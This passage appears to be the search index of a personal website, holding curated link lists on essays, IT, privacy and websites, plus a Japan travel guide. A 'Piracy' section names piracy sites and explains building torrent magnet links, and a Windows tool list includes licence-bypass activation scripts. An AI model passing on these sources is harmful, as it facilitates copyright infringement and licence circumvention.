Hanauer: \"To: My Fellow Zillionaires [...] You show me a highly unequal society, and I will show you a police state. Or an uprising.\"</li> <li>This is Financial Advice - Folding Ideas</li> <li>What is Money - Gary Clarke</li> <li>The Colonial Origins of Comparative Development: An Empirical Investigation - paper by DARON ACEMOGLU, SIMON JOHNSON, AND JAMES A. ROBINSON or 2024 prize lecture in economic sciences</li> <li>Causal Inference: The Mixtape - Scott Cunningham: encompasses the tools and methods necessary to arrive at meaningful answers to the questions of causation.</li> </ul>"},{"location":"content/links/essays/#physics","title":"Physics","text":"<ul> <li>All objects and some questions - Charles H. Lineweaver, Vihan M. Patel</li> <li>Expanding Confusion: common misconceptions of cosmological horizons and the superluminal expansion of the Universe - Tamara M. Davis, Charles H. Lineweaver</li> </ul>"},{"location":"content/links/essays/#photography","title":"Photography","text":"<ul> <li>How DSLR Cameras Work - Markus Kohlpaintner</li> <li>The Photographer Who Takes No Pictures - Kodo Simone: Why and what we capture, filter, and keep snapshots from our lives.</li> </ul>"},{"location":"content/links/essays/#stories","title":"Stories","text":"<ul> <li>Don't Hex the Water - exurb1a: Story about privacy.</li> <li>Gone But Not Forgotten. Mr Chi-City Kicks it with a Friend by MrChiCity3: Guy going to a friends grave and having a heart(warming/breaking) conversation.</li> <li>Life Lessons from the Death Bed - Katie Zakrzewski: Lessons from taking care of people in their last days in a hospice.</li> <li>Sassy the Sasquatch - The Big Lez Show and The Big Lez Show is a Masterpiece - harryfromends</li> <li>Stoop Coffee: How simple things bring people together and how to foster that for your immediate community.</li> <li>The Cab Ride I'll Never Forget - Kent Nerburn: Very short story about 'little' moments that are more important than anything.</li> <li>The Egg - Andy Weir: We are all the same, interconnected fragmented being.</li> <li>The Last Church - Fan Animated pre Horus Heresy Short Story (Alternative link) - Kill Team Hungary YTC: Warhammer story about the last priest in the last church having a conversation about faith.</li> <li>There Is No Antimemetics Division - qntm: a short SCP book about how humans communicate and remember.</li> </ul>"},{"location":"content/links/essays/#uncategorized","title":"Uncategorized","text":"<ul> <li>Always More History - Hillel Wayne</li> <li>Asynchronous conversations - Manuel Moreale and The Quiet Web - Brian Koberlein</li> <li>Breaching the Trust Thermocline - Gareth Edwards</li> <li>Chaos Communication Congress recordings - Chaos Computer Club: Congress offers lectures and workshops and various events on a multitude of topics including (but not limited to) information technology and generally a critical-creative attitude towards technology and the discussion about the effects of technological advances on society.</li> <li>Do: Sol LeWitt\u2019s Electrifying Letter of Advice on Self-Doubt, Overcoming Creative Block, and Being an Artist and the audio version (even better actually): Benedict Cumberbatch reads Sol LeWitt's letter to Eva Hesse</li> <li>Evaluation of Russia by Finnish Intelligence Colonel (Original video lecture) - Martti J. Kari</li> <li>How to Pick a Career - Tim Urban and VIA 24 Character Strengths -  VIA Institute on Character</li> <li>How to Prepare A Good Presentation - Konstantin Tretyakov</li> <li>Life exists because the law of increasing entropy - Natalie Wolchover</li> <li>Line Goes Up \u2013 The Problem With NFTs - Folding Ideas</li> <li>Making Sense of VRChat - People Make Games</li> <li>Neural Adaptation and Perception of Music - Anton Slavin</li> <li>Nine Things I Learned in Ninety Years - Edward Packard</li> <li>On keeping sketchbooks - Matt Kirkland and Pretty Sketchy - Jason Santa Maria</li> <li>Ristirahvas lohvi otsas - Mihkel Mutt</li> <li>Ronald Reagan &amp; the Biggest Failure in Physics - BobbyBroccoli</li> <li>Shitposting is an art -  Sam Greszes</li> <li>Social anxiety - Louis Rossmann</li> <li>The \"Do Something About It\" Club - Ratika Deshpande</li> <li>The bizarre, true story of Metal Gear Solid\u2019s English translation -  Jeremy Blaustein</li> <li>The Game That Outsold The Halo Franchise.. And Killed A Man - Manley Reviews</li> <li>The Girl Internet and the Boy Internet - Rebecca Jennings</li> <li>The Incredible Rise of North Korea\u2019s Hacking Army - Ed Caesar</li> <li>The Intellectual We Deserve - Nathan J. Robinson</li> <li>The Network State - Balaji Srinivasan</li> <li>The Tail End - Tim Urban</li> <li>Tiktok's enshittification - Cory Doctorow</li> <li>Treat your to-read pile like a river, not a bucket - Oliver Burkeman</li> <li>Underrated Ways to Change the World - Adam Mastroianni: Change often feels possible only at a macro level, leaving us feeling powerless. However, it's the subtle, micro-level actions that truly weave the tapestry of change.</li> <li>Unexpected Poetry of PhD Acknowledgements - Tabitha Carvan</li> <li>Valve's Gambling Problem - People Make Games</li> <li>Why Everyone Is Quitting Their Job To Play Call of Duty - BDobbinsFTW</li> <li>Why Games like Call of Duty Are Bad For You, But Games Like RuneScape Are GOOD For you! - BDobbinsFTW</li> <li>Yak shaving - Jeremy H. Brown</li> <li>The Tiny Teams Playbook - Shawn swyx Wang: team creation advice from 7 teams with 100 people and 200m ARR.</li> </ul>"},{"location":"content/links/essays/#favourite-authors","title":"Favourite authors","text":"<ul> <li>BDobbinsFTW</li> <li>Brett Scott</li> <li>ContraPoints</li> <li>Errant Signal</li> <li>Explanation Point</li> <li>Folding Ideas</li> <li>Jacob Geller</li> <li>jan Misali</li> <li>Louis Rossmann</li> <li>Max Derrat</li> <li>More To That</li> <li>oliSUNvia</li> <li>Patrick Boyle</li> <li>People Make Games</li> <li>Philosophy Tube</li> <li>Raptitude</li> <li>Shaun</li> <li>Sisyphus 55</li> <li>Solar Sands</li> <li>Steven Wittens</li> <li>Thane Bishop</li> <li>Wait But Why</li> <li>Whitelight</li> <li>Enn Kasak</li> </ul>"},{"location":"content/links/interesting/","title":"Interesting","text":"<ul> <li>10 rules of productive online communication - gen Z edition - Tu\u1ea5n Mon</li> <li>2b2t wiki: Insane stories from the oldest anarchy server in Minecraft.</li> <li>A visual book recommender - Nathan Rooy</li> <li>Absurd Trolley Problems</li> <li>Bicycle</li> <li>Cameron's World</li> <li>CONTINUE AND PERSIST: Every day, thousands of Cease and Desist letters are issued, telling people to stop what they\u2019re doing, send someone you appreciate</li> <li>Electricity Maps</li> <li>Every Noise At Once</li> <li>Fauux Neocity</li> <li>Growing Living Rat Neurons To Play... DOOM? - The Thought Emporium</li> <li>Has The LHC Destroyed The World Yet?</li> <li>How Rich Am I?</li> <li>How to tie your shoes - Terry Moore and Granny Knot</li> <li>I Hired 5 People to Sit Behind Me and Make Me Productive for a Month - Simon Berens</li> <li>Ig Nobel Prize Winner Higashiyama Atsuki and the \"Between-Legs Effect\"</li> <li>Internet friends building a network of modern villages and The Network State Podcast</li> <li>Journal of the Data Visualization Society - statistics representation and data visualization analysis and advice.</li> <li>Just World Cultural License</li> <li>Let's Chat street epistemology</li> <li>List of chess variants</li> <li>Making Software - Dan Hollick: manual that explains how the things you use everyday actually work.</li> <li>Male Reality Calculator and Female Delusion Calculator</li> <li>Maps Distort How We See the World</li> <li>Maps Distort How We See the World - Tomas Pueyo</li> <li>MMD - V.I.P. (aka how actual gunfights look like) - Zen</li> <li>neal.fun</li> <li>Nominative determinism</li> <li>One Terabyte of Kilobyte Age and A one person oral history of Geocities</li> <li>Ranger Roll - Wil Willis</li> <li>Should it be a meeting?</li> <li>SON OF A DUNGEON: Making Of - Corridor Crew</li> <li>textfiles</li> <li>The Art of the Shadow: How Painters Have Gotten It Wrong for Centuries - Roberto Casati</li> <li>The Cube Rule</li> <li>The insane VFX of Live Sports - Corridor Crew</li> <li>The Library Of Babel</li> <li>The Phrontistery and Etymonline: Discover half-remembered rare or obscure words and phrases.</li> <li>The Pretty Good House</li> <li>Theodore's Thick Coins - Theodore Nichols</li> <li>Tildes</li> <li>uses this and Hacker Stations</li> <li>Vlaspatta Karamazov music playlists</li> <li>VRChat</li> <li>What is permaculture?</li> <li>WTF Happened In 1971?!</li> <li>xkcd</li> <li>You just won a 656 Million Dollar Lottery! an official \u2018Continue and Persist\u2019 Letter.</li> </ul>"},{"location":"content/links/interesting/#favourite-authors","title":"Favourite authors","text":"<ul> <li>3Blue1Brown</li> <li>CGP Grey</li> <li>CrashCourse</li> <li>CS Ghost Animation</li> <li>LegalEagle</li> <li>PBS Space Time</li> <li>Physics Videos by Eugene Khutoryansky</li> <li>Vsauce</li> </ul>"},{"location":"content/links/it/","title":"IT","text":""},{"location":"content/links/it/#links","title":"Links","text":""},{"location":"content/links/it/#development","title":"Development","text":"<ul> <li>20 Things I\u2019ve Learned in my 20 Years as a Software\u00a0Engineer -  Justin Etheredge</li> <li>40 years of programming - Lars Wirzenius</li> <li>Comprehensive Rust</li> <li>Few lesser known tricks, quirks and features of C</li> <li>Lies we tell ourselves to keep using Golang - Amos Wenger</li> <li>Reproducible Builds and NixOS</li> <li>software that sucks less</li> <li>The documentation system</li> </ul>"},{"location":"content/links/it/#devops","title":"DevOps","text":"<ul> <li>90DaysOfDevOps</li> <li>Advanced Bash-Scripting Guide</li> <li>Bash Pitfalls - Greg GreyCat</li> <li>Easy Automated Snapshot-Style Backups with Linux and Rsync - Mike Rubel</li> <li>pure bash bible</li> <li>Sad Servers</li> <li>What time is it? A simple question with a complex answer. - Andrea Corbellini</li> </ul>"},{"location":"content/links/it/#networking","title":"Networking","text":"<ul> <li>dn42</li> <li>Implement DNS in a weekend - Julia Evans</li> <li>Load Balancing - Sam Rose</li> <li>Mediocre Engineer\u2019s guide to HTTPS - Devon Peroutky</li> <li>Practical Networking - Virtual Local Area Networks (VLANs) - Ed Harmoush</li> <li>Rule 53</li> <li>Why was Facebook down for five hours? - Ben Eater</li> </ul>"},{"location":"content/links/it/#orchestration","title":"Orchestration","text":"<ul> <li>barco - Linux Containers from Scratch</li> <li>Cloud Native Interactive Landscape</li> <li>The container orchestrator landscape</li> </ul>"},{"location":"content/links/it/#machine-learning","title":"Machine Learning","text":"<ul> <li>colah's blog about ML, DL, NN</li> <li>LLM Visualization</li> <li>Neural Networks and Deep Learning</li> <li>Practical Deep Learning</li> <li>Semaphore: Full-Body Keyboard</li> <li>Spreadsheets are all you need - Learn how AI works from a real LLM implemented entirely in Excel</li> <li>What Is ChatGPT Doing \u2026 and Why Does It Work?</li> </ul>"},{"location":"content/links/it/#security","title":"Security","text":"<ul> <li>DevSec Hardening Framework</li> <li>How Not To Secure Your Company (Target Data Breach) - Kevin Fang</li> <li>Kerberos - Designing an Authentication System: a Dialogue in Four Scenes</li> <li>Meltdown and Spectre</li> <li>WebAuthn</li> <li>Why is OAuth still hard in 2023? - Robin Guldener and What OAuth 2 is, how it works, what you need to know to use it</li> </ul>"},{"location":"content/links/it/#gamedev","title":"Gamedev","text":"<ul> <li>3D Math Primer for Graphics and Game Development - Fletcher Dunn &amp; Ian Parbery</li> <li>Future of real-time upscaling - 2kliksphilip</li> <li>Mapping The Internet - 8AAFFF</li> <li>The Book of Shaders - Patricio Gonzalez Vivo and Jen Lowe</li> <li>Via: Solving the 100 GB Problem - Ryan Flaherty</li> </ul>"},{"location":"content/links/it/#webdev","title":"Webdev","text":"<ul> <li>Coolors</li> <li>CSS Layout</li> <li>CSS: The Good Parts - Yoav Ganbar</li> <li>evergreen resources</li> <li>freakphone resources</li> <li>Free Frontend</li> <li>Frosted Glass from Games to the Web: Frosted acrylic design elements inspired by Forza games brought to the web.</li> <li>humans.txt</li> <li>newlambda resources</li> <li>Pokemon Cards CSS: A collection of advanced CSS styles to create realistic-looking effects for the faces of Pokemon cards.</li> <li>The 512KB Club</li> <li>Visual design rules you can safely follow every time</li> </ul>"},{"location":"content/links/it/#hardware","title":"Hardware","text":"<ul> <li>A Summary of Electronics</li> <li>An intuitive approach for understanding electricity and Watch electricity hit a fork in the road at half a billion frames per second and Why does WATER change the speed of electricity? by AlphaPhoenix</li> <li>Branch prediction by Dan Luu: pseudo-transcript for a talk on branch prediction going over different algorithms.</li> <li>Build an 8-bit computer from scratch by Ben Eater and 68 Katy \u2013 68000 Linux on a Solderless Breadboard by Steve Chamberlin</li> <li>From Nand to Tetris - Building a Modern Computer From First Principles - Shimon Schocken and Noam Nisan</li> <li>Hands Down Keyboard Layout</li> <li>History of ARM - Jeremy Reimer</li> <li>How Microchips Work - Markus Kohlpaintner</li> <li>LoRa Mesh Network With Off-the-Shelf Hardware - Tom Nardi</li> <li>Primer: core concepts in electronic circuits and Radios, how do they work? - lcamtuf</li> </ul>"},{"location":"content/links/it/#fonts","title":"Fonts","text":"<ul> <li>Atkinson Hyperlegible Font</li> <li>Comic Mono</li> <li>Fantasque Sans Mono</li> <li>jdsalaro's Top Five Fonts for Programming</li> <li>Recursive Sans &amp; Mono</li> </ul>"},{"location":"content/links/it/#learning","title":"Learning","text":"<ul> <li>Computer Networking (Deepdive) - LiveOverflow</li> <li>Crash Course: Computer Science</li> <li>CS 253 Web Security - Feross Aboukhadijeh</li> <li>Di\u00e1taxis - A systematic approach to technical documentation authoring.</li> <li>Git for Beginners: Zero to Hero - Jayson Salazar Rodriguez and Getting out of trouble by understanding Git by Steve Smith and Conventional Commits and Git From the Bottom Up by John Wiegley</li> <li>How DNS Works</li> <li>How Python virtual environments work</li> <li>How to Build an Agent or: The Emperor Has No Clothes - Thorsten Ball: Practical examples on how to arrive at a useful CLI agent.</li> <li>How to Use Oscilloscopes, Logic Analyzers, Multimeters, and More - Zack Freedman</li> <li>Introduction to a Self Managed Life - FUTO software</li> <li>Map of Computer Science - Domain of Science</li> <li>Online Cryptography Course from Stanford, also in Coursera - Dan Boneh</li> <li>Putting the \"You\" in CPU and repo - Lexi Mattick</li> <li>SpaceTraders API Game: API-based game, learn a new programming language by building an interface.</li> <li>Teach Yourself Computer Science</li> <li>The Missing Semester of Your CS Education</li> </ul>"},{"location":"content/links/it/#uncategorized","title":"Uncategorized","text":"<ul> <li>.the .product and video of .the .product [HD 60fps] and elevated and video of elevated</li> <li>ASCII textfiles archive</li> <li>Choose an open source license</li> <li>Ditherpunk - Surma</li> <li>DIY Git in Python</li> <li>Do What The Fuck You Want To Public License</li> <li>Egoless Engineering - Dan McKinley: \"Computer scientists like me start their career by realizing that they accidentally joined a math major that isn\u2019t a science, and isn\u2019t about computers. It\u2019s about how abstract work gets done and stuff. [...] Things might be better if we tried to think about work as much as we think about the computers.\"</li> <li>Eternal September</li> <li>Explained from First Principles</li> <li>Fast machines, slow machines - Julio Merino</li> <li>Fireship</li> <li>Fuck Off As A Service</li> <li>Going to an Interview for Web Design Dressed as a Giant Spider</li> <li>Hacker News</li> <li>Hacker Scripts</li> <li>How to get rich as a solo software developer - Fireship</li> <li>Infinite-Storage-Glitch using video on Youtube</li> <li>Interactive map of Linux kernel</li> <li>Internet Artifacts - neal</li> <li>Internet in a Box</li> <li>internet quote collection</li> <li>libcimbar: Color Icon Matrix Barcodes</li> <li>Linux and FOSS News</li> <li>Making Chat (ro)Bots - Boston Dynamics</li> <li>Most favorited Hacker News posts of all time</li> <li>RTINGS</li> <li>Software Design is Knowledge Building - Facundo Olano: Systems design comes from mental models which are hard to grasp even with good documentation, some theories say that it is impossible to hand over a system to new people without the creator(s)/previous maintainers explaining and answering questions to build the models in the brains of the next.</li> <li>The early days of Linux</li> <li>The Jargon File and The Hacker's Dictionary</li> <li>The Website is Down #1: Sales Guy vs. Web Dude - Josh Weinberg</li> <li>TOP500 - Supercomputer stats</li> <li>What can I do for Arch Linux?</li> </ul>"},{"location":"content/links/it/#favourite-authors","title":"Favourite authors","text":"<ul> <li>Andreas Kling</li> <li>Ben Eater</li> <li>Digital Foundry</li> <li>LiveOverflow</li> <li>Louis Rossmann</li> <li>Socratica</li> <li>Four Years Remaining</li> </ul>"},{"location":"content/links/it/#10-commandments-of-it","title":"10 commandments of IT","text":"<ol> <li>You are replaceable at work, but you are not replaceable at home</li> <li>Users lie</li> <li>Fridays are read-only</li> <li>Under-promise, over-deliver</li> <li>Test your backups</li> <li>Poor planning on a user's part does not constitute an emergency on ours</li> <li>Cover your ass; if you think it's going to be a disaster, get it in writing</li> <li>It's always DNS</li> <li>Are you certain it is plugged in?</li> <li>Reboot; if it still doesn't work, reboot again.</li> </ol>"},{"location":"content/links/piracy/","title":"Piracy","text":"<p>r/Piracy Megathread</p> <p>Awesome Piracy repository</p> <p>r/FREEMEDIAHECKYEAH Megathread</p>"},{"location":"content/links/piracy/#general","title":"General","text":"<ul> <li>1337x</li> </ul>"},{"location":"content/links/piracy/#games","title":"Games","text":"<ul> <li>CDromance</li> <li>cs.rin.ru</li> <li>FitGirl Repacks</li> <li>The Complete Abandonware Need For Speed Download List</li> </ul>"},{"location":"content/links/piracy/#books","title":"Books","text":"<ul> <li>Anna's Archive</li> <li>Audiobookbay</li> </ul> <p>Audiobookbay without an account</p> <p>To get the torrent magnet, locate the <code>infohash</code> field of from your torrent info and paste into your torrent client using the following format: <code>magnet:?xt=urn:btih:infohash</code>. For example: if the infohash is <code>abc123</code>, then the magnet link will need to be pasted into your torrent client as <code>magnet:?xt=urn:btih:abc123</code>.</p> <ul> <li>libgen.fun</li> <li>libgen.rs</li> <li>Sci Hub</li> </ul>"},{"location":"content/links/piracy/#anime","title":"Anime","text":"<ul> <li>Nyaa</li> </ul>"},{"location":"content/links/piracy/#software","title":"Software","text":"<ul> <li>monkrus</li> </ul>"},{"location":"content/links/podcasts/","title":"Podcasts","text":"<ul> <li>Cox n' Crendor Show</li> <li>Hello Internet</li> <li>Lex Fridman Podcast</li> <li>\u00d6\u00f6\u00fclikool (Vikerraadio \u00d6\u00f6\u00fclikooli arhiiv)</li> </ul>"},{"location":"content/links/privacy/","title":"Privacy","text":""},{"location":"content/links/privacy/#browser-extensions","title":"Browser extensions","text":"<p>Firefox extension recommendations</p> <ul> <li>ClearURLs</li> <li>Firefox Local Translations</li> <li>Firefox Multi-Account Containers</li> <li>Temporary Containers</li> <li>Terms of Service; Didn\u2019t Read</li> <li>UBlock</li> <li>Fanboy's Annoyances lists for UBlock</li> </ul>"},{"location":"content/links/privacy/#block-lists","title":"Block lists","text":"<ul> <li>Let's Block It!</li> </ul>"},{"location":"content/links/privacy/#passwords","title":"Passwords","text":"<ul> <li>KeePassXC - No-nonsense, ad-free, tracker-free, and cloud-free Cross-platform Password Manager.</li> <li>Spectre passwords</li> </ul>"},{"location":"content/links/privacy/#communcation","title":"Communcation","text":"<ul> <li>matrix</li> </ul>"},{"location":"content/links/privacy/#guides-articles-other","title":"Guides, Articles &amp; Other","text":"<ul> <li>JustDeleteMe - A directory of direct links to delete your account from web services.</li> <li>PRISM Break</li> <li>Privacy Guides</li> </ul>"},{"location":"content/links/privacy/#windows-tools","title":"Windows tools","text":"<ul> <li>Microsoft-Activation-Scripts</li> <li>O&amp;O ShutUp10++</li> </ul>"},{"location":"content/links/procrastination/","title":"Procrastination","text":"<ul> <li>9/21 - Demi Adejuyigbe</li> <li>Achievements In Ignorance</li> <li>Ancient Memes And Internet Classics Playlist - PyroGothNerd</li> <li>Cofe time for in talk english - markorepairs</li> <li>Every version of Bad Apple</li> <li>HIDARI Stop Motion Samurai Film</li> <li>history of the entire world, i guess - bill wurtz</li> <li>JamFox's Favorites YouTube Playlist</li> <li>Not Safe Wait What YouTube Playlist</li> <li>POOTIS ENGAGE and Pootis Engage // EXTREME</li> <li>rat spin 10 hours</li> <li>The Fall of Minecraft's 2b2t (NOCOM exploit) - FitMC</li> <li>The Secret Behind 2b2t\u2019s LARGEST Base - FitMC</li> <li>Turning a Sphere Outside In - Huggbees</li> </ul>"},{"location":"content/links/procrastination/#favourite-authors","title":"Favourite authors","text":"<ul> <li>2kliksphilip</li> <li>Abroad in Japan</li> <li>BroScienceLife</li> <li>Casually Explained</li> <li>Colin Furze</li> <li>Corridor Crew</li> <li>FUNKe</li> <li>How To Drink</li> <li>I did a thing</li> <li>Internet Historian</li> <li>Japanalysis</li> <li>kliksphilip</li> <li>Morphologis</li> <li>Primitive Technology</li> <li>RossCreations</li> <li>Silo Entertainment</li> <li>The Educated Barfly</li> <li>Zack Freedman</li> </ul>"},{"location":"content/links/sites/","title":"Sites","text":"<p>Discover new sites:</p> <ul> <li>Awwwards - The awards for design, creativity and innovation on the Internet.</li> <li>Funky webring</li> <li>indieblog.page</li> <li>Neocreatives webring</li> <li>retronaut webring</li> <li>the html review</li> <li>Where have all the websites gone?</li> <li>wiby.me - Random WEB1.0 sites</li> </ul>"},{"location":"content/links/sites/#favorite-web-designs","title":"Favorite web designs","text":"<ul> <li>acko.net</li> <li>bikobatanari.art</li> <li>charm.sh</li> <li>cinni.net</li> <li>cyuucat.moe</li> <li>dustinbrett.com</li> <li>egypt.urnash.com</li> <li>eli.wtf</li> <li>ellesho.me</li> <li>freakphone.net</li> <li>fretnoize.neocities.org</li> <li>hamishw.com</li> <li>icyphox.sh</li> <li>ilithya.rocks</li> <li>jvns.ca</li> <li>katsuricata.com</li> <li>kyomakus.online</li> <li>larsmagnus.co</li> <li>matt-rickard.com</li> <li>mauss.dev</li> <li>menmy.neocities.org</li> <li>night.fm</li> <li>nokocchi.com</li> <li>nonkiru.art</li> <li>peelopaalu.neocities.org</li> <li>peppe.rs</li> <li>philcifone.com</li> <li>pizzza.neocities.org</li> <li>portal.thenifty.com</li> <li>reimertz.co</li> <li>renaudrohlinger.com</li> <li>rknight.me</li> <li>stonegray.ca</li> <li>surma.dev</li> <li>taylor.town</li> <li>theabsoluterealm.com</li> <li>Theodore's Thick Coins - Theodore Nichols</li> <li>twelvemen.neocities.org</li> <li>v4.jasonsantamaria</li> <li>xeiaso.net</li> <li>neverhack.com</li> </ul>"},{"location":"content/travel/japan-guide/","title":"Japan Guide","text":""},{"location":"content/travel/japan-guide/#general","title":"General","text":"<p>Snacks EU e-store: https://www.nikankitchen.com/</p> <p>Before going check the official visit Japan web.</p> <p>How to Spend 14 Days in JAPAN - Abroad in Japan</p> <p>Ultimate Tokyo Guide - Abroad in Japan</p> <p>In Tokyo the train stations are coded like JY01 JY02 etc because the Japanese names are so long. when you use google maps keep an eye out for that. There\u2019s a learning curve but once you get it you\u2019ll always take the train. One thing about this though, if you ask a random stranger on the street how to get to a train station by its code there's a high chance they won't know what you mean.</p> <p>There are express trains when you go to and from the airport. Some of them you need to get extra tickets (besides the Suica card)</p> <p>Get cash for shopping and refilling suica etc</p> <p>If you have iPhone. Get the Suica card on the Apple wallet because it\u2019s hard to charge physical cards with credit cards.</p> <p>Download google translate download Japanese and you can translate any Japanese words with the camera on.</p> <p>Try to learn a bit of Japanese. People generally know English, but they'll rake you over the coals for a bit before they realize they're not getting anywhere.</p> <p>General places:</p> <ul> <li>Watch a godzilla movie in theaters</li> <li>Mount Fuji, different routes, front is shielded from winds, back is not, so it's colder. But front is more crowded.</li> <li>traditional onsen</li> <li>arcades</li> <li>shirnes</li> <li>stay at a machiya</li> <li>Uniqlo and thrift stores</li> </ul>"},{"location":"content/travel/japan-guide/#first-steps-when-arriving","title":"First steps when arriving","text":"<ol> <li>To left of where people wait for arriving travellers is 7-eleven ATM for cash.</li> <li>Get Suica card.</li> <li>Most people use Keikyu train to get to Tokyo. Cash or Suica only! Most people going to Tokyo will want to get on Shinagawa line. Shinagawa is a hub which connects multiple other lines. TICKETS ARE NEEDED TO ENTER AND EXIT!</li> </ol>"},{"location":"content/travel/japan-guide/#manners-dos-donts","title":"Manners, Dos, Donts","text":"<ul> <li>eating and drinking while walking</li> <li>always say food was the best youve ever eaten when waiter asks</li> <li>being late is a major faux pas</li> <li>significance of handling business cards</li> <li>taxi doors</li> <li>answering phone calls in public places forbidden</li> <li>wearing sunglasses and shorts</li> <li>using escalators</li> <li>pointing</li> <li>someone has reserved the table using their possessions</li> </ul>"},{"location":"content/travel/japan-guide/#cities","title":"Cities","text":""},{"location":"content/travel/japan-guide/#tokyo","title":"Tokyo","text":"<p>Places:</p> <ul> <li>Harmonica alley (less known bar district)</li> <li>Takao mountain and surrounding area with parks, lakes, nature: (Kristen soovitas!)</li> <li>Omoide Yokocho - Maze of narrow alleyways with bars and restaurants</li> <li>Golden Gai - Similar to Omoide, but more cyberpunkish, more verticality. Kind of a tourist trap, expensive.</li> <li>piss alley</li> <li>Day trip destinations: Kamakura/Enoshima, Hakone (There's an onsen there you can book for an hour with private pools that look out over the mountain. There's also a gorgeous cedar grove on the shores of the lake. On a clear day, you can see Mt. Fuji from the lakeside.), or Takao-san</li> <li>jazz kissaten, My absolute favorite kissaten in Tokyo is Cafe Edinburgh in Shinjuku 3-chome. It's on the second floor above a Family Mart right outside one of the Metro exits. If you go, get the morning set. The coffee and toast are divine.</li> <li>Ghibli museum</li> <li>Asahi Building</li> <li>Ramen Museum</li> <li>The National Museum</li> <li>Edo-Tokyo museum</li> <li>Hamamonyo's shop. They sell tenugui - small cloth towel. </li> <li>Maid Cafe/other cafes, Cat Cafe, robot/Heavy Metal like bar</li> <li>Arcades</li> <li>parks, Ueno park</li> <li>big shopping areas like Ginza and Omote Sendo are like big Fashion Valley malls. So neat if you want to shop big brands but not particularly interesting or novel.</li> <li>If you're into fashion, you should check out Shimokitazawa. Lots of vintage and thrifting.</li> <li>Aoyama Cemetery - the serenity.</li> <li>Nihonbashi and 'kilometer zero' on that bridge - to feel the weight of history and brashness of modern day construction practice that put a highway above it. The area used to be the starting point of major travel routes, including the one that went all the way to Kyoto. What is believed to be the first department store in Japan is nearby.</li> <li>Tokyo Metropolitan Government Building Observatory is free and you get a great view of Tokyo!</li> <li>Team Labs in Toyosu. It's like an interactive art exhibit that you walk through.</li> <li>Shibuya Sky when you're in Shibuya: https://www.shibuya-scramble-square.com/sky/</li> <li>super-tiny-bar hop tour enough.</li> <li>TeamLab Planets</li> </ul> <p>Food:</p> <ul> <li>Toyko Hyatt in Shinjuku. $$$ but the view is amazing as is the vibe and food. Where Lost in Translation was filmed.</li> <li>Lost bar, abroad in japan bar</li> <li>Shibuya Parco bar</li> <li>Momopara is an all you can eat shyabu-shyabu place. You will die from meat but oh what a way to go.</li> <li>Tsujiri - Green Tea parfait place</li> <li>$$$ - Jiro in Ginza. It\u2019s not sushi. It\u2019s something else.</li> <li>Poniprika</li> <li>favorite Indian place is \u30ab\u30ec\u30fc\u5c02\u9580\u5e97 \u30de\u30b5\u30e9 in Ekoda</li> <li>best pizza I've had in the world is DevilCraft in Kanda, it's deep dish and they are also a brewery. Reservations required.</li> </ul>"},{"location":"content/travel/japan-guide/#kyoto","title":"Kyoto","text":"<p>Places:</p> <ul> <li>Nara, domesticated deer and like the largest buddhist temple in the world</li> <li>Ryoan-ji</li> <li>Kamo River is nice for people watching. The 'Delta' area, from which you can take a short walk up to Shimogamo Shrine through a small primeval forest, or the Sanjo~Shijo area where people sit along the bank while keeping equal distance between each group automagically.</li> <li>A short hike up Mt. Daimonji-yama to take in the view.</li> <li>Fushimi Inari, but go up the mountain - there are a ton of gorgeous graves</li> <li>Philosophers Walk</li> <li>Bamboo Forest</li> <li>\u014ck\u014dchi Sans\u014d Garden</li> <li>Kyoto Handicraft Center which is one of the best souvenir shop in Kyoto my opinion.</li> <li>try to spectate a training session in the historic building of the Butokuden / Kyoto Budo Center. If you can catch an iaido session it's as if you were transported back in the Meiji era.</li> </ul> <p>Food:</p> <ul> <li>obanzai food which is home cooking style not very heavily seasoned dishes</li> <li>sake breweries</li> </ul>"},{"location":"content/travel/japan-guide/#osaka","title":"Osaka","text":"<p>Places:</p> <ul> <li>Osaks World Expo (13 april to 13 oct)</li> <li>Mount Koya (Koyasan), south of Osaka</li> <li>Dotonbori</li> <li>osaka castle</li> <li>http://www.spaworld.co.jp/english/</li> <li>baseball games, batting cage?</li> <li>Cup Noodles museum</li> <li>Den Den Town is the Osaka equivalent to Tokyo's Akibahara district</li> <li>Square-Enix cafe</li> <li>Parco shinsaibashi, 6/7th floor (can\u2019t remember exactly sorry) has the ghibli store, Lego store, Godzilla store, capcom store, good for fun pics</li> <li>Parco shinsaibashi, B2 has some cool little bar type restaurants etc</li> <li>Tsutenkaku/shinsekai area for some kushikatsu</li> <li>Osaka aquarium</li> <li>umeda sky building</li> <li>Uranamba, a very japanesey looking street with some nice bars and restaurants. Also runs parallel to douguyasuji which is the kitchen street that supplies restaurants, some interesting shops to get some souvenirs and a shop that makes fake food for window displays where you can buy some quirky stuff</li> <li>Misono Building - (from: small brained american) renovated hotel where each room is a different bar, but might be demolished at the end of 2024???</li> </ul> <p>Food:</p> <ul> <li>takoyaki</li> <li>okonomiyaki, Osaka specialty</li> <li>Sumiyoshi Taisha</li> </ul>"},{"location":"content/travel/japan-guide/#okinawa","title":"Okinawa","text":"<p>Places:</p> <ul> <li>Junglia</li> <li>The aquarium</li> <li>Yakuza okinawa destinations</li> <li>hello kitty exhibition touring in Okinawa</li> </ul>"},{"location":"content/travel/japan-guide/#grocery-stores","title":"Grocery stores","text":"<p>7/11 - Best</p> <p>FamilyMart - Similar to 7/11</p> <p>Lawson - Worse than others</p>"},{"location":"content/travel/japan-guide/#fast-foods","title":"Fast Foods","text":""},{"location":"content/travel/japan-guide/#burgers","title":"Burgers","text":"<p>McDonalds - Good prices, better menu, seasonal menu items.</p> <p>Mos Burger - Good burgers, but SUPER tiny.</p>"},{"location":"content/travel/japan-guide/#beefbowlgyudon","title":"Beefbowl/gyudon","text":"<p>Sukiya - Most variety, manarisu place.</p> <p>Matsuya - A little less interesting than Sukiya, a little worse.</p> <p>Yoshinoya - cheapest, almost like a knockoff version of the others.</p>"},{"location":"content/travel/japan-guide/#hang-out-places","title":"Hang out places","text":"<p>Torikizoku - Everything is around 3 dollars, including alcohol, meant to be a good place to be for a long time and hang out without spending a lot of money.</p>"},{"location":"content/travel/japan-guide/#comfort-foods","title":"Comfort foods","text":"<p>Yayoiken - Set meals, aka teishoku, basically japanese mom foods, super good.</p> <p>Hotto Motto - Similar to yayoiken, but bento style, a little less interesting, a little worse.</p> <p>Cocoichi - Curry place, expensive, but best curry in the world.</p> <p>Seveteen Ice - Ice cream place/vending machine, cheap and tasty</p>"},{"location":"content/travel/japan-guide/#sushikaitenzushi","title":"Sushi/kaitenzushi","text":"<p>Sushiro and Kura Sushi - quite similar and can't go wrong with 